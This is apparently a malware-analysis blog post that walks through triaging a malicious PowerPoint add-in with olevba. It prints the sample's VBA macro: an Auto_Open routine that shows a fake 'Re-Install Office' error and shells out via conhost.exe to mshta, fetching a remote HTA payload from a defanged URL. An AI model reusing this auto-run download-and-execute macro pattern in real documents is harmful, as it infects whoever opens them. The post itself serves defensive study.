---
layout: post
title: "Looking at PowerPoint Macros with Olevba"
date: 2022-01-07
categories: malware powerpoint macros mshta olevba
permalink: /powerpoint-macros-olevba/
---

In this post I want to walk through analysis of a malicious PowerPoint file using `olevba`. This tool allows you to view macros within Office documents without opening them. If you want to follow along at home, I'm using this sample from MalwareBazaar:

[https://bazaar.abuse.ch/sample/a0f6d9d905b64be221a64da385ad1fd14542c93b35f23cdcbedf71febc68a505/](https://bazaar.abuse.ch/sample/a0f6d9d905b64be221a64da385ad1fd14542c93b35f23cdcbedf71febc68a505/)

## Triaging the File

VirusTotal and MalwareBazaar think the sample is a PowerPoint file with macros, but they could always be wrong. We can confirm using the `file` utility.

```console
remnux@remnux:~/cases/ppt$ file PO04012022.ppam 
PO04012022.ppam: Microsoft PowerPoint 2007+
```

Sure enough, the magic bytes say the file is a PowerPoint presentation. Now let's take a look at the size with `exiftool`.

```console
remnux@remnux:~/cases/ppt$ exiftool PO04012022.ppam 
ExifTool Version Number         : 12.30
File Name                       : PO04012022.ppam
Directory                       : .
File Size                       : 8.6 KiB
File Modification Date/Time     : 2022:01:06 02:01:18-05:00
File Access Date/Time           : 2022:01:05 21:17:11-05:00
File Inode Change Date/Time     : 2022:01:05 21:03:25-05:00
File Permissions                : -rw-r--r--
File Type                       : PPAM
File Type Extension             : ppam
MIME Type                       : application/vnd.ms-powerpoint.addin.macroEnabled.12
Zip Required Version            : 20
Zip Bit Flag                    : 0
Zip Compression                 : Deflated
Zip Modify Date                 : 2022:01:03 23:05:02
Zip CRC                         : 0xb918195e
Zip Compressed Size             : 283
Zip Uncompressed Size           : 597
Zip File Name                   : [Content_Types].xml
```

The file weighs in at under 9 KiB, so I would hazard a guess that it doesn't contain much, if any, embedded content like binaries. Now let's dig in with analysis tools.

## Analyzing the PPAM

We can issue a simple `olevba` command and see the output that comes back by default.

```console
remnux@remnux:~/cases/ppt$ olevba PO04012022.ppam 
olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: PO04012022.ppam
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Class1.cls 
in file: ppt/qwqwae.d - OLE stream: 'VBA/Class1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function lol()
Debug.Assert (VBA.Shell("c:\windows\system32\calc\..\conhost.exe c:\windows\system32\calc\..\conhost.exe mshta hxxp://www.j[.]mp/askswewewewzxzxkd"))
End Function

-------------------------------------------------------------------------------
VBA MACRO Module11.bas 
in file: ppt/qwqwae.d - OLE stream: 'VBA/Module11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
Dim obj As New Class1
Debug.Print MsgBox("ERROR!Re-Install Office", vbOKCancel); returns; 1
obj.lol
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |hxxp://www.j[.]mp/asks|URL                                        |
|          |wewewewzxzxkd       |                                             |
|IOC       |conhost.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

There's a fair bit of information to work through here. Olevba does some analysis work for you to point out suspicious features of the macro code. First, the sample contains macro code defining an `Auto_Open` function. Just like it sounds, whatever is in this function will get executed as soon as the document gets opened. The output shows olevba found possible obfuscated strings, an executable name, and a URL. Looking further back we can see the actual macro code. First, let's take a look at that `Auto_Open` function.

```vb
Sub Auto_Open()
Dim obj As New Class1
Debug.Print MsgBox("ERROR!Re-Install Office", vbOKCancel); returns; 1
obj.lol
End Sub
```

The macro creates an object `obj` of the type Class1, which must also be defined in the macro. It pops up a messagebox (MsgBox) with an error message to distract the victim. Finally, it calls the function `obj.lol()`. Let's dive into Class1 to see what its `lol()` function does.

```vb
Public Function lol()
Debug.Assert (VBA.Shell("c:\windows\system32\calc\..\conhost.exe c:\windows\system32\calc\..\conhost.exe mshta hxxp://www.j[.]mp/askswewewewzxzxkd"))
End Function
```

The `lol()` function uses `VBA.Shell` to launch the command in the provided string. As for the string, I'm not really sure what they're trying to do here. I assume they're going for some form of evasion where they somehow call `mshta.exe` but muddy the water with `conhost.exe` processes during analysis. The sandbox report from [Joe Sandbox](https://www.joesandbox.com/analysis/548357/1/html) doesn't indicate `mshta.exe` actually executed. As for the final payload, the adversary presumably has a HTML Application (HTA) file hosted at `hxxp://www.j[.]mp/askswewewewzxzxkd` and if `mshta.exe` downloads executes the payload it might execute arbitrary script content.

That's it for today, thanks for reading!
